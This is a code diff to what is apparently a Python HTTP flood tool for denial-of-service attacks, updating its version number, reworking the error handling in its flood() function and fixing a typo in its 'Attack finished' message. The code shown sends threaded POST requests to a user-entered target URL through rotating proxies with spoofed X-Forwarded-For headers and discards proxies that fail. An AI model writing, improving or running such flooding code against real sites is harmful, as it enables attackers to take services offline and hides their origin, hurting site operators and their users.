@@ -17,7 +17,7 @@ from halo import Halo
 
 
 os.system('clear')
-__version__ = '4.0.6 BETA'
+__version__ = '4.0.9 BETA'
 __method__ = 'HTTP'
 #  
 # --------------------------------------
@@ -153,20 +153,19 @@ def flood(target: str) -> None:
         headers = generate_headers()
         try:
             proxy = random.choice(proxies)
-            response = requests.post(target,headers=headers, proxies=proxy, timeout=5)
-        except (Timeout, OSError):
-            continue
-        else:
-            status = f"{F.GREEN if response.status_code == 200 else F.RED}({response.status_code}){F.RESET}"
+            response = requests.post(target, headers=headers, proxies=proxy, timeout=5)
+            status = f"{F.GREEN if response.status_code == 200 else F.RED}( {response.status_code} ){F.RESET}"
             payload_size = f"{F.GREEN} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
             proxy_addr = f"| {F.GREEN}Proxy: {F.CYAN}{proxy['http']:>21}"
             ip_fake = f"IP: {headers['X-Forwarded-For']}"
             print(f"{status}: Request Sent! --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
-            if response.status_code != 200:
-                try:
-                    proxies.remove(proxy)
-                except ValueError:
-                    proxies = get_http_proxies()
+        except (Timeout, OSError):
+            continue
+        if response.status_code != 200:
+            try:
+                proxies.remove(proxy)
+            except ValueError:
+                proxies = get_http_proxies()
 
 def start_flooding(target: str, thread_count: int, duration: int) -> None:
     """Start multiple threads to flood the target."""
@@ -179,7 +178,7 @@ def start_flooding(target: str, thread_count: int, duration: int) -> None:
     while time.time() < stop_time:
         time.sleep(sleeptime)  # Keep the main thread alive until duration ends
 
-    print(f"\n{F.CYAN}( DONE ) {F.GREEN}Attac finished after {duration} seconds.{F.RESET}")
+    print(f"\n{F.CYAN}( DONE ) {F.GREEN}Attack finished after {duration} seconds.{F.RESET}")
 
 if __name__ == "__main__":
     target_url = input(f"{F.CYAN}(?){F.RESET} target URL: {F.GREEN}")
